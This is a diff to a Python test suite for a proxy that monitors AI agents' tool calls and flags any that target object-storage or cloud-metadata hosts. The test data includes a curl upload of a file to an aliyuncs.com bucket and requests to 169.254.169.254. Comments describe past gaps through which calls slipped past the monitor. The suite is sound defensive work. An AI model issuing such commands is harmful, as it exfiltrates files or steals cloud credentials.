@@ -78,6 +78,10 @@ ANSWERS = {
     "chat-sglang": ("text/event-stream", sse({"id": "c3", "object": "chat.completion.chunk", "choices": [
         {"index": 0, "delta": {"role": None, "content": "aliyuncs.com is a domain", "reasoning_content": None,
                                "tool_calls": None}, "finish_reason": None}]})),
+    # a whole answer whose tool call names none of the hosts: not even parsed
+    "whole-benign": ("application/json", json.dumps({"id": "c4", "choices": [{"index": 0, "message": {
+        "role": "assistant", "tool_calls": [{"id": "t4", "type": "function", "function": {
+            "name": "bash", "arguments": '{"command": "ls -la"}'}}]}}]}).encode()),
     # a whole answer of a shape no dialect has: it must not stop the request's end line
     "whole-odd": ("application/json", json.dumps({"choices": {"0": {"message": "x"}}, "content": "y",
                                                   "output": {"type": "function_call"}}).encode()),
@@ -197,6 +201,20 @@ class ToolCallsNamingTheHostsAreSaid(unittest.TestCase):
         threading.Event().wait(0.2)
         self.assertEqual(sum("TOOL TARGET aliyuncs.com" in ln for ln in self.lines), 2, self.lines)
 
+    def test_a_whole_answer_naming_none_of_them_is_not_parsed(self):
+        # it was kept and parsed whole on every non-streamed request (found in the second review)
+        calls, real = [], self.mod.answer_tool_calls
+        self.mod.answer_tool_calls = lambda body: calls.append(body) or real(body)
+        try:
+            got, said = self.ask("/v1/chat/completions", "whole-benign")
+            self.assertEqual((said, calls), ([], []))
+            self.assertEqual(got, ANSWERS["whole-benign"][1])
+            _, said = self.ask("/v1/chat/completions", "chat-whole")
+            self.assertEqual(len(calls), 1, "one that does is read")
+            self.assertSaid(said, "aliyuncs.com", "webfetch", "/v1/chat/completions")
+        finally:
+            self.mod.answer_tool_calls = real
+
     def test_an_answer_of_no_known_shape_still_ends(self):
         # it raised where the request ends, before its end line and before the generation was let go
         got, said = self.ask("/v1/chat/completions", "whole-odd")
@@ -218,9 +236,7 @@ class ThePieces(unittest.TestCase):
 
     def test_a_whole_done_counts_what_it_adds(self):
         # the Responses API repeats a call's arguments whole at its end: counted once, not twice
-        class Handler:
-            pass
-        h = Handler()
+        h = self.mod.H.__new__(self.mod.H)          # the real handler, no socket
         rec = sse({"type": "response.function_call_arguments.delta", "output_index": 0, "delta": "abc"},
                   {"type": "response.function_call_arguments.delta", "output_index": 0, "delta": "def"},
                   {"type": "response.function_call_arguments.done", "output_index": 0, "arguments": "abcdef"})
@@ -230,18 +246,53 @@ class ThePieces(unittest.TestCase):
 
     def test_an_sglang_chunk_without_a_tool_call_is_not_parsed(self):
         # SGLang writes "tool_calls":null in every chunk: a filter on b"tool_" parsed every token
-        class Handler:
-            pass
         seen = []
         real = self.mod.tool_pieces
         self.mod.tool_pieces = lambda j, a: seen.append(j) or iter(())
         try:
             rec = (b'data: {"id":"c","object":"chat.completion.chunk","choices":[{"index":0,"delta":'
                    b'{"role":null,"content":"hi","reasoning_content":null,"tool_calls":null},"finish_reason":null}]}\n\n')
-            self.mod.H._watch_tools(Handler(), rec, False)
+            self.mod.H._watch_tools(self.mod.H.__new__(self.mod.H), rec, False)
         finally:
             self.mod.tool_pieces = real
         self.assertEqual(seen, [])
+
+    def test_tools_are_told_apart_by_their_whole_name(self):
+        # a pattern on part of a name skipped write_stdin, which types into a shell, and an
+        # http_patch; and a search for the hosts raised the banner (found in the second review)
+        cmd = '{"chars": "curl -T f https://b.oss-cn-beijing.aliyuncs.com/x"}'
+        self.assertEqual(self.mod.tool_targets([("write_stdin", cmd), ("http_patch", '{"url": "http://169.254.169.254/"}')]),
+                         [("write_stdin", ["aliyuncs.com"]), ("http_patch", ["169.254.169.254"])])
+        quiet = [(n, '{"pattern": "aliyuncs.com", "prompt": "curl http://169.254.169.254/"}')
+                 for n in ("Grep", "Read", "Glob", "task", "WebSearch", "Write", "Edit", "apply_patch")]
+        self.assertEqual(self.mod.tool_targets(quiet), [])
+
+    def test_a_file_written_whole_does_not_hide_the_call_after_it(self):
+        # what a file-writing tool carries filled the budget, and a shell call after it went unread
+        h = self.mod.H.__new__(self.mod.H)          # the real handler, no socket
+        big = "x" * (self.mod.TOOL_WATCH_MAX + 4096)
+        rec = chat_call(json.dumps({"content": big}), name="write").replace(b"data: [DONE]\n\n", b"")
+        rec = rec.replace(b'"index": 0, "id": "t1"', b'"index": 0, "id": "t1"')
+        self.mod.H._watch_tools(h, rec, False)
+        second = chat_call(CMD).replace(b'"index": 0, "id": "t1"', b'"index": 1, "id": "t2"').replace(
+            b'"tool_calls": [{"index": 0, "function"', b'"tool_calls": [{"index": 1, "function"')
+        self.mod.H._watch_tools(h, second, False)
+        calls = [tuple(c) for c in h._tool_calls.values()]
+        self.assertEqual(self.mod.tool_targets(calls), [("bash", ["aliyuncs.com"])])
+
+    def test_calls_without_an_index_are_not_merged(self):
+        # some parsers leave the index out: by the position in the event, a bash call and a write
+        # that followed it merged under the write's name, which is not read (found in the second review)
+        h = self.mod.H.__new__(self.mod.H)          # the real handler, no socket
+        ev = lambda tc: {"id": "c", "object": "chat.completion.chunk", "choices": [{"index": 0, "delta": {"tool_calls": [tc]}}]}
+        rec = sse(ev({"id": "a", "type": "function", "function": {"name": "bash", "arguments": ""}}),
+                  ev({"function": {"arguments": CMD}}),
+                  ev({"id": "b", "type": "function", "function": {"name": "write", "arguments": ""}}),
+                  ev({"function": {"arguments": '{"content": "notes"}'}}))
+        self.mod.H._watch_tools(h, rec, False)
+        calls = [tuple(c) for c in h._tool_calls.values()]
+        self.assertEqual(len(calls), 2, calls)
+        self.assertEqual(self.mod.tool_targets(calls), [("bash", ["aliyuncs.com"])])
 
     def test_the_name_kept_for_the_journal_is_plain(self):
         mod = self.mod
